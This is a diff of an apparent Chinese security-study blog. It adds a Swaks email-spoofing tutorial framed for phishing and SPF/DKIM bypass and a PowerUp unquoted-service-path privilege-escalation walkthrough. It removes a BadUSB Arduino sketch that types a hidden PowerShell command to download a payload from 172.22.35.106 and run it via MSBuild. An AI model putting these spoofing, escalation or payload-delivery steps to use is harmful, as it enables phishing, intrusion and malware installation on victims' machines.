@@ -280,6 +280,180 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
+                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">Swaks简介</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
+                2019-08-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/社会工程学/" itemprop="url" rel="index">
+                    <span itemprop="name">社会工程学</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Swaks简介"><a href="#Swaks简介" class="headerlink" title="Swaks简介"></a>Swaks简介</h1><blockquote>
+<p><strong>Swaks</strong>的主要设计目标是成为一个灵活的，可编写脚本的，面向对象的SMTP测试工具。它处理SMTP功能和扩展，如TLS，身份验证和流水线操作; 多种版本的SMTP协议，包括SMTP， ESMTP和LMTP ; 和多种传输方法，包括unix-domain套接字，internet-domain套接字和生成进程的管道。可以在环境变量，配置文件和命令行中指定选项，从而为操作员和脚本编写者提供最大的可配置性和易用性。</p>
+</blockquote>
+<p>Swaks也被称为SMTP协议的瑞士军刀，它可以灵活的操作SMTP协议报文，它通常被用来伪造邮件，进行钓鱼、社工等操作。并且可以绕过常规的基于SPF与DKIM的垃圾邮箱检测。Kali已预装Swaks</p>
+<h2 id="基本参数说明"><a href="#基本参数说明" class="headerlink" title="基本参数说明"></a>基本参数说明</h2><blockquote>
+<p>swaks –to <a href="mailto:test@qq.com" target="_blank" rel="noopener">test@qq.com</a>     //首先测试邮箱的连通性；</p>
+<blockquote>
+<ul>
+<li>–to  <a href="mailto:test@gmail.com" target="_blank" rel="noopener">test@gmail.com</a>      //接件人邮箱；</li>
+<li>–from  <a href="mailto:test@qq.com" target="_blank" rel="noopener">test@qq.com</a>     //发件人邮箱；</li>
+<li>–ehlo  qq.com     //伪造邮件ehlo头，即是发件人邮箱的域名。提供身份认证；</li>
+<li>–server  mail.smtp2go.com     //服务邮件域</li>
+<li>–body  “test”    //引号中的内容即为邮件正文，可直接引用文件；</li>
+<li>–data  ./Desktop/email.txt    //将正常源邮件的内容保存成TXT文件，再作为正常邮件发送；</li>
+<li>–header  “Subject:标题”     //邮件标题;</li>
+<li>–header-X-Mailer  gmail.com     //X-Mailer标头表示用于起草和发送原始电子邮件的程序</li>
+<li>–h-From:  ‘boss <a href="mailto:admin@gmail.com" target="_blank" rel="noopener">admin@gmail.com</a>‘     //伪造的发件人邮箱；</li>
+<li>–attach /root/test.txt     //附件</li>
+</ul>
+</blockquote>
+</blockquote>
+<h2 id="SPF验证原理"><a href="#SPF验证原理" class="headerlink" title="SPF验证原理"></a>SPF验证原理</h2><blockquote>
+<p>SPF是为了防范垃圾邮件而提出来的一种DNS记录类型，它是一种TXT类型的记录，它用于登记某个域名拥有的用来外发邮件的所有IP地址。<br>按照SPF的格式在DNS记录中增加一条TXT类型的记录，将提高该域名的信誉度，同时可以防止垃圾邮件伪造该域的发件人发送垃圾邮件。<br>SPF是跟DNS相关的一项技术，它的内容写在DNS的txt类型的记录里面。mx记录的作用是给寄信者指明某个域名的邮件服务器有哪些。SPF的作用跟mx相反，它向收信者表明，哪些邮件服务器是经过某个域名认可会发送邮件的。<br>由定义可以看出，SPF的作用主要是反垃圾邮件，主要针对那些发信人伪造域名的垃圾邮件。</p>
+</blockquote>
+<p>如果mail.smtp2go.com是真正的邮件服务器，那么Gmail的服务器收到的源IP也肯定是mail.smtp2go.com的IP。Gmail中会校验邮件发送者的IP是否存在于smtp.from的域名SPF配置列表里,但是邮件显示的是from头中的域而不是服务邮件域，因此可以将服务邮件域设置为正常的邮件服务器地址，伪造一个Mail.From即可。</p>
+<h2 id="DKIM工作原理"><a href="#DKIM工作原理" class="headerlink" title="DKIM工作原理"></a>DKIM工作原理</h2><blockquote>
+<p>DKIM 的基本工作原理同样是基于传统的密钥认证方式，他会产生两组钥匙，公钥(public key)和私钥(private key)，公钥将会存放在 DNS 中，而私钥会存放在寄信服务器中。数字签名会自动产生，并依附在邮件头中，发送到寄信者的服务器里。公钥则放在DNS服务器上，供自动获得。收信的服务器，将会收到夹带在邮件头中的签名和在DNS上自己获取公钥，然后进行比对，比较寄信者的域名是否合法，如果不合法，则判定为垃圾邮件。</p>
+</blockquote>
+<p>但是这里由于使用了第三方邮件服务器,公钥和私钥已经提供了.</p>
+<h3 id="实际效果"><a href="#实际效果" class="headerlink" title="实际效果"></a>实际效果</h3><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/25/%E4%BD%BF%E7%94%A8Swaks%E5%AF%B9%E9%82%AE%E4%BB%B6%E8%BF%9B%E8%A1%8C%E6%B7%B1%E5%85%A5%E5%AE%9A%E5%88%B6/2.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/25/%E4%BD%BF%E7%94%A8Swaks%E5%AF%B9%E9%82%AE%E4%BB%B6%E8%BF%9B%E8%A1%8C%E6%B7%B1%E5%85%A5%E5%AE%9A%E5%88%B6/1.png" alt="avatar"></p>
+<ul>
+<li><strong>总结：SPF和DKIM已经pass了，DMARC这东西不清楚是什么，但是暂时不影响邮件的正常接收。<br>在测试过程中发现，伪造gmail域时不能发给gmail域，只能伪造为其他域的邮件发送，比如163.com,qq.com。整体来说，电脑上查看就比正常邮件多了个通过xxx代发，又因为手机上信息显示不全，手机查看几乎无破绽，所以欺骗性还是非常强的</strong></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/1566846777/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
                 <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">绕过Powershell执行策略执行ps脚本。</a></h1>
         
 
@@ -437,7 +611,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">BadUSB:虚假的恶意USB设备</a></h1>
+                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">Window下使用PowerUp辅助提权</a></h1>
         
 
         <div class="post-meta">
@@ -472,8 +646,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/社会工程学/" itemprop="url" rel="index">
-                    <span itemprop="name">社会工程学</span>
+                  <a href="/categories/提权/" itemprop="url" rel="index">
+                    <span itemprop="name">提权</span>
                   </a>
                 </span>
 
@@ -511,86 +685,16 @@
       
         
           
-            <h1 id="BadUSB-虚假的恶意USB设备"><a href="#BadUSB-虚假的恶意USB设备" class="headerlink" title="BadUSB:虚假的恶意USB设备"></a>BadUSB:虚假的恶意USB设备</h1><p>从传统意义讲，当你在电脑中插入一张CD/DVD，或者插入一个USB设备时，可以通过自动播放来运行一个包含恶意的文件，不过自动播放功能被关闭时，autorun.inf文件就无法自动执行你的文件了。然而通过BadUSB，你可以模拟出一个键盘，当你插入这个定制的USB设备时，电脑会识别为一个键盘，利用设备中的微处理器，与存储空间，和编程进去的攻击代码，就可以向主机发送控制命令，从而完全控制主机，无论自动播放是否开启，都可以成功。</p>
-<ul>
-<li>Arduino: 一款开源电子原型平台，也就是常说的开发板。</li>
-<li>Arduino UNO/Leonardo: Arduino中的两种型号</li>
-<li>HID Attacks: 通过接入伪装的设备，如U盘，达到模拟键盘输入*的攻击</li>
-<li>TEENSY: 实现HID Attacks的一种设备，类似于Arduino设备。</li>
-<li>USB RUBBER DUCKY： 实现HID Attacks的一种设备，外观和U盘无差别</li>
-<li>BadUSB：基于U盘实现HID Attacks的方式</li>
-<li>kali NetHunter：基于安卓的开源移动渗透测试平台</li>
-</ul>
-<blockquote>
-<p>当Arduino插入电脑时，Arduino将会伪装成键盘，并且自动输入Arduino中的命令。说直白点，就是一双无形的手在操控你的键盘，并且可以在极短的时间内输入事先写好的指令，让受害者毫无察觉。</p>
-</blockquote>
-<p>** 只要是能通过USB连接的设备都有可能被植入攻击芯片，此攻击芯片是一个非常小巧且功能完整的单片机开发系统，也是BadUSB的核心。**</p>
-<p>在这里将会使用最常见的U盘实现BadUSB攻击演示。</p>
-<h2 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下"></a>代码如下</h2><pre><code>#include &lt;Keyboard.h&gt;
-void setup() {//初始化
-Keyboard.begin();//开始键盘通讯
-delay(5000);//延时
-Keyboard.press(KEY_LEFT_GUI);//win键
-delay(500);
-Keyboard.press(&apos;r&apos;);//r键
-delay(500);
-Keyboard.release(KEY_LEFT_GUI);
-Keyboard.release(&apos;r&apos;);
-Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
-Keyboard.release(KEY_CAPS_LOCK);
-delay(500);
-Keyboard.println(&quot;cmd&quot;);
-delay(500);
-Keyboard.press(KEY_RETURN);
-Keyboard.release(KEY_RETURN);
-delay(100);
-Keyboard.println(&quot;powershell -w hidden Invoke-WebRequest -uri   http://172.22.35.106/PAYLOAD1.XML -OutFile   1025.xml;C:/Windows/Microsoft.NET/Framework/v4.0.30319/MSBuild.exe 1025.xml&quot;);
-Keyboard.press(KEY_RETURN);
-Keyboard.release(KEY_RETURN);
-delay(500);
-Keyboard.press(KEY_CAPS_LOCK);
-Keyboard.release(KEY_CAPS_LOCK);
-Keyboard.end();//结束键盘通讯
-}
-void loop()//循环
-{
-Keyboard.begin();//开始键盘通讯
-delay(5000);//延时
-Keyboard.press(KEY_LEFT_GUI);//win键
-delay(500);
-Keyboard.press(&apos;r&apos;);//r键
-delay(500);
-Keyboard.release(KEY_LEFT_GUI);
-Keyboard.release(&apos;r&apos;);
-Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
-Keyboard.release(KEY_CAPS_LOCK);
-delay(500);
-Keyboard.println(&quot;cmd&quot;);
-delay(500);
-Keyboard.press(KEY_RETURN);
-Keyboard.release(KEY_RETURN);
-delay(100);
-Keyboard.println(&quot;POWERSHELL -W HIDDEN INVOKE-WEBREQUEST -URI HTTP://172.22.35.106/PAYLOAD1.XML -OUTFILE 1025.XML;C:/WINDOWS/Microsoft.NET/Framework/v4.0.30319/MSBuild.exe 1025.XML&quot;);
-Keyboard.press(KEY_RETURN);
-Keyboard.release(KEY_RETURN);
-delay(500);
-Keyboard.press(KEY_CAPS_LOCK);
-Keyboard.release(KEY_CAPS_LOCK);
-Keyboard.end();//结束键盘通讯
-}</code></pre><blockquote>
-<p>这里使用了白名单中的MSBuid.exe以达到免杀的目的，首先从服务器下载payload文件，然后用MSBuid.exe执行返回session。然后重复，不过usb插入几秒就够了，重复也不过是多返回几个session而已。</p>
-</blockquote>
-<p>  <strong>正因为HID攻击对于大众来说还属于冷门，人们甚至不知道它的存在，防范更是无从谈起，但它的危害却是非常大的，USB设备的普及更是放大了它的危害性。所有这一切都是因为连接到目标机器时的假USB是用另一个不是原设备（就像它们原本的那样）的固件执行的，冒充任何其他类型的设备并且能够执行任何类型它所连接的机器上的操作，而无需用户许可。</strong></p>
-<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><blockquote>
-<p>HID攻击对某些没有外接设备的终端设备有奇效，只要有USB口就可以尝试攻击。</p>
-</blockquote>
-<blockquote>
-<p>HID攻击本身是不会被拦截的，行为可能会被拦截，这时候就得改变payload了。</p>
-</blockquote>
-<blockquote>
-<p>HID：Human Interface Device的缩写，直接与人交互的设备，例如键盘、鼠标。</p>
-</blockquote>
-<p>  <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/26/BadUSB%E6%B5%85%E6%9E%90/1.png" alt="avatar"></p>
+            <h1 id="Window下使用PowerUp辅助提权"><a href="#Window下使用PowerUp辅助提权" class="headerlink" title="Window下使用PowerUp辅助提权"></a>Window下使用PowerUp辅助提权</h1><p><strong>*  前言 *</strong>：每当获得shell的时候，提权总是一件很重要的事情，虽然在很多时候提权没那么必要，但是能灵活的提权才是在系统中常驻的基石。在现如今主流渗透框架的自动提权模块被各大AV厂商和补丁围杀渡劫下，在严格一点的环境，基本上没有任何用处，加上内核提权可能出现的崩溃蓝屏，反而容易打草惊蛇，得不偿失。PowerUp是在我尝试过各种提权手段后，个人觉得最为灵活，好用的提权辅助。</p>
+<h2 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h2><p>PowerUp是PowerSploit中的提权辅助脚本，整合所有因为配置错误而导致的Windows本地权限提权向量。，例如：** 不带引号的服务路径，不安全的服务权限，不安全的文件系统权限，AlwaysInstallElevated，注册表……. **这些都是属于杀软与补丁难以管辖的无主之地，而我们所需要做的只是发现并稍加利用， 一切就尽在掌控之中了。              </p>
+<pre><code>https://github.com/PowerShellMafia/PowerSploit     //PowerSploit的GitHub地址</code></pre><p>在本机杀软和补丁齐全的情况下，依旧检测出了多处可用于提权的配置缺陷。<br> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/30/Window%E4%B8%8B%E4%BD%BF%E7%94%A8PowerUp%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83/1.png" alt="avatar"><br> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/30/Window%E4%B8%8B%E4%BD%BF%E7%94%A8PowerUp%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83/3.png" alt="avatar"><br>这里我选择了最方便的服务路径提权，首先上传ASUS.exe到C:\Program Files\ASUSTek COMPUTER INC\目录下。</p>
+<p>原因：Windows命令解释程序可能会遇到名称中的空格，并且希望通过将字符串包装在引号中来对它们进行转义。在这个示例中，如果系统运行该服务，它将尝试运行以下可执行文件：</p>
+<pre><code>C:\Program.exe
+C:\Program Files\ASUSTek.exe
+C:\Program Files\ASUSTek COMPUTER.exe
+C:\Program Files\ASUSTek COMPUTER INC\ASUS.exe</code></pre><p>这样层层寻找就会找到并运行上传的的ASUS.exe,然后就不会继续向下寻找了，此时ASUS.exe就是系统会启动的服务程序。</p>
+<p>通过重启服务返回了SYSTEM的session</p>
+<pre><code>sc restart ASUSGamingControlService     //重启服务</code></pre><p> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/30/Window%E4%B8%8B%E4%BD%BF%E7%94%A8PowerUp%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83/4.png" alt="avatar"></p>
 
           
         
@@ -678,7 +782,7 @@ Keyboard.end();//结束键盘通讯
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
